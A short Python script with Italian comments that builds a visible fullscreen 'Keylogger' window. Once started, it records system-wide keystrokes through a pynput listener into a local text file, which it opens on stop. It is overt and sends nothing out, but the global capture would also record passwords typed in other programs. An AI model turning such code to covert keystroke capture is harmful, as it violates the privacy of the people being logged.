import tkinter as tk
from pynput import keyboard
from queue import Queue
import os

class KeyloggerGUI:
    def __init__(self, master):
        self.master = master
        self.master.title("Keylogger")
        self.bg_color = "#87cefa"  # Colore di sfondo della finestra e dei pulsanti
        self.master.configure(bg=self.bg_color)
        self.master.attributes('-fullscreen', True)  # Apri la finestra in modalità fullscreen
        self.is_running = False

        self.text_color = "#000000"  # Colore del testo
        self.border_color = "#000000"  # Colore dei bordi

        self.start_button = tk.Button(master, text="Start Keylogger", command=self.start_keylogger, bg=self.bg_color, fg=self.text_color, highlightbackground=self.border_color, borderwidth=2, width=15, height=2)
        self.start_button.place(relx=0.5, rely=0.4, anchor=tk.CENTER)

        self.stop_button = tk.Button(master, text="Stop Keylogger", command=self.stop_keylogger, state=tk.DISABLED, bg=self.bg_color, fg=self.text_color, highlightbackground=self.border_color, borderwidth=2, width=15, height=2)
        self.stop_button.place(relx=0.5, rely=0.6, anchor=tk.CENTER)

        self.log_queue = Queue()
        self.log_listener = keyboard.Listener(on_press=self.on_key_press)
        self.log_listener.start()
        self.master.after(100, self.check_queue)

    def start_keylogger(self):
        self.is_running = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

    def stop_keylogger(self):
        self.is_running = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.open_log_file()
        self.master.destroy()

    def open_log_file(self):
        file_path = "keyprofile.txt"
        if os.path.exists(file_path):
            os.system(f"start {file_path}")
        else:
            print("Il file di log non esiste.")

    def on_key_press(self, key):
        if self.is_running:
            self.log_queue.put(key)

    def check_queue(self):
        while not self.log_queue.empty():
            key = self.log_queue.get()
            if isinstance(key, keyboard.KeyCode):
                char = key.char
                with open("keyprofile.txt", 'a') as logKey:
                    logKey.write(char)
            elif key == keyboard.Key.space:
                with open("keyprofile.txt", 'a') as logKey:
                    logKey.write(" ")
            elif key == keyboard.Key.enter:
                with open("keyprofile.txt", 'a') as logKey:
                    logKey.write("\n")
        self.master.after(100, self.check_queue)

def main():
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
